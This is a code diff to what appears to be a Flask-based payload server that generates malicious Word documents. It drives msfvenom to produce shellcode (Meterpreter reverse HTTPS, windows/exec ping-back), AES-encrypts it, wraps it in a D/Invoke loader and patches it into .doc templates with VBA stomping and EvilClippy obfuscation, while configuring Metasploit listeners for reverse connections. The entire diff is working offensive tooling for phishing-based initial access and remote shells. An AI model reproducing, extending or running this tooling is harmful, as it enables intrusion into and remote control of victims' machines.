@@ -94,6 +94,7 @@ CFGS = [
     "linux/meterpreter_reverse_https",
     "windows/pingback_reverse_tcp",
     "windows/messagebox",
+    "windows/exec",
 ]
 
 LISTENER_CONFIGS = {}
@@ -111,13 +112,17 @@ for cfg in CFGS:
         if arch == 32:
             full_payload = f"{platform}/{payload}"
 
-        LISTENER_CONFIGS[key][arch] = BASIC_LISTENER_CONFIG | {
+        LISTENER_CONFIGS[key][arch] = {
             "Payload": full_payload,
         }
 
-        if "winhttps" in full_payload:
-            LISTENER_CONFIGS[key][arch]["HttpProxyIE"] = False
+        if "https" in full_payload:
+            LISTENER_CONFIGS[key][arch] = LISTENER_CONFIGS[key][arch] | BASIC_LISTENER_CONFIG 
+            if 'win' in full_payload:
+                LISTENER_CONFIGS[key][arch] = LISTENER_CONFIGS[key][arch] | {"HttpProxyIE": False}
 
+# from pprint import pprint
+# pprint(LISTENER_CONFIGS)
 
 msf_client = None
 
@@ -762,7 +767,14 @@ def get_ip(adapter: str) -> str:
 @win.route('/')
 def word_form():
     import os
-    template = render_template('1_win_form.html')
+    template = ""
+    template += f"<br>"
+    template += f"{request.headers['Incoming']}{request.path}?ladapter=tun0&lport=443&uid=test"
+    # template = template.replace('tun0', get_host()[0])
+    # template = "reminder:<br>"
+    # template += "?ladapter=eth0&lport=443&uid=test"
+    template += render_template('1_win_form.html')
+    
     ladapter = request.args.get('ladapter', '')
     lport = request.args.get('lport', 443)
     uid = request.args.get('uid', os.popen("uuidgen | sed 's/-//g'").read())
@@ -778,21 +790,20 @@ def word_form():
     return template
 
 
-def gen_multiple_payloads(lhost, lport, proxy, id, config="windows_meterpreter_reverse_winhttps", endpoint="ms", archs=[32, 64]):
+def gen_multiple_payloads(lhost, lport, proxy, id, config="windows_meterpreter_reverse_winhttps", endpoint="ms", archs=[32, 64], extra_args = {"LURI": "","HttpProxyIE": False}):
     retval = {}
     print(f"{archs=}")
     for arch in archs:
         endpoint_msfvenom = f"/{endpoint}/{id}_{str(arch)}/"
+        if "LURI" in extra_args.keys():
+            extra_args["LURI"] = endpoint_msfvenom
         print(f"{config=}")
         print(f"{endpoint_msfvenom=}")
         print(f"{LISTENER_CONFIGS[config][arch]=}")
         setup_listener(
             lhost,
             lport,
-            LISTENER_CONFIGS[config][arch] | {
-                "LURI": endpoint_msfvenom,
-                "HttpProxyIE": proxy,
-            }
+            LISTENER_CONFIGS[config][arch] | extra_args
         )
         a = generate_payload(
             LISTENER_CONFIGS[config][arch]["Payload"],
@@ -800,10 +811,7 @@ def gen_multiple_payloads(lhost, lport, proxy, id, config="windows_meterpreter_r
             lport,
             'raw',
             [
-                {
-                    "LURI": endpoint_msfvenom,
-                    "HttpProxyIE": proxy,
-                }
+                extra_args
             ]
         )
         retval[arch] = a
@@ -904,7 +912,7 @@ def generate_encrypted_payload(id: str, lhost: str, lport: int, password: str, a
         raise ValueError("Invalid id")
 
     payloads = gen_multiple_payloads(
-        lhost, lport, proxy, id, config=payload_type, endpoint="ms", archs=[arch]
+        lhost, lport, proxy, id, config=payload_type, endpoint="ms", archs=[arch], extra_args={"LURI": "replaceme", "HttpProxyIE": proxy}
     )
 
     raw_bytes = payloads[arch]
@@ -998,9 +1006,74 @@ exit"""
         return f.read()
 
 
+def generate_word_pingback_aes(lhost, lport, proxy, id, template_path: str, stomp_vba: bool = False) -> Optional[BytesIO]:
+    from tempfile import NamedTemporaryFile
+    import uuid
+    
+    if proxy:
+        ps_type = "ps_proxy"
+    else:
+        ps_type = "ps"
+    command_text = f"ping -n 1 {lhost}"
+    password = str(uuid.uuid4()).replace('-', '')
+    encoded_powershell_command = encode_ps(command_text)
 
 
-def generate_word_file_aes(lhost, lport, proxy, id, template_path: str, stomp_vba: bool = False) -> Optional[BytesIO]:
+    payloads = {}
+    with NamedTemporaryFile(mode='rb', delete=True) as shellcode_file:
+        shellcode_path = pathlib.Path(shellcode_file.name)
+        os.system(f'''msfvenom -a x86 -p windows/exec CMD="{command_text}" -f raw -o {shellcode_path}''')
+        shellcode_file.seek(0)
+        raw_bytes_x32 = shellcode_file.read()
+        # payloads[32] = raw_bytes_x32
+        payloads[32] = openssl_pbkdf2_encrypt(raw_bytes_x32, password)
+
+    # 64-bit payload
+    with NamedTemporaryFile(mode='rb', delete=True) as shellcode_file:
+        shellcode_path = pathlib.Path(shellcode_file.name)
+        os.system(f'''msfvenom -p windows/x64/exec CMD="{command_text}" -f raw -o {shellcode_path}''')
+        shellcode_file.seek(0)
+        raw_bytes_x64 = shellcode_file.read()
+        # payloads[64] = raw_bytes_x64
+        payloads[64] = openssl_pbkdf2_encrypt(raw_bytes_x64, password)
+
+
+    
+    print(f"{payloads =}")
+    payloads['ps'] = encoded_powershell_command
+    payloads['password'] = password
+    
+    payload_entry = generate_dinvoke_x64_x86(payloads)
+
+    if isinstance(payload_entry, str):
+        with open(f"{PAYLOAD_DIR}/{payload_entry}", 'rb') as f:
+            shellcode = f.read()
+    elif isinstance(payload_entry, bytes):
+        shellcode = payload_entry
+    else:
+        raise ValueError("Unsupported shellcode payload type")
+
+    # password = str(uuid.uuid4()).replace('-', '')
+
+    with NamedTemporaryFile(delete=False) as shellcode_file:
+        shellcode_path = pathlib.Path(shellcode_file.name)
+        shellcode_file.write(shellcode)
+
+    doc_path = pathlib.Path(template_path)
+    with NamedTemporaryFile(delete=False) as output_file:
+        output_path = pathlib.Path(output_file.name)
+    
+
+    # shellcode_path = pathlib.Path("/tmp/loader.bin")
+
+    patch_document(doc_path, shellcode_path, output_path, password)
+
+    with open(output_path, 'rb') as f:
+        patched_data = f.read()
+
+    return BytesIO(patched_data)
+
+def generate_word_revshell_aes(lhost, lport, proxy, id, template_path: str, stomp_vba: bool = False) -> Optional[BytesIO]:
     from tempfile import NamedTemporaryFile
     import uuid
     
@@ -1077,25 +1150,21 @@ def word_get():
 
     if payload_type == "vba_shellcode":
         payloads = gen_multiple_payloads(
-            lhost, lport, proxy, id, config="windows_meterpreter_reverse_winhttps", endpoint="ms", archs=[32, 64])
+            lhost, lport, proxy, id, config="windows_meterpreter_reverse_winhttps", endpoint="ms", archs=[32, 64]
+        )
         template_path = "payload_holders/shellcode_runner_obfs_EvilClippy.doc"
         word_file_stream = generate_word_file(
             template_path, [encrypt_raw_payload(payloads[32]), encrypt_raw_payload(payloads[64])], stomp_vba)
     elif payload_type == "aes_shellcode_revshell":
         template_path = "/mnt/exploits/vba/template/eas_encrypted_shellcode.doc"
-        word_file_stream = generate_word_file_aes(
+        word_file_stream = generate_word_revshell_aes(
             lhost, lport, proxy, id, template_path, stomp_vba
         )
 
     elif payload_type == "aes_shellcode_pingback":
-        payloads = gen_multiple_payloads(
-            lhost, config="windows_meterpreter_reverse_winhttps", endpoint="ms", archs=[32]
-        )
-        encrypted_bytes_32 = payloads[32]
-        encrypted_bytes_64 = payloads[64]
         template_path = "/mnt/exploits/vba/template/eas_encrypted_shellcode.doc"
-        word_file_stream = generate_word_file(
-            template_path, [encrypted_bytes_32, encrypted_bytes_64], stomp_vba
+        word_file_stream = generate_word_pingback_aes(
+            lhost, lport, proxy, id, template_path, stomp_vba
         )
     else:
         return "Invalid type", 400
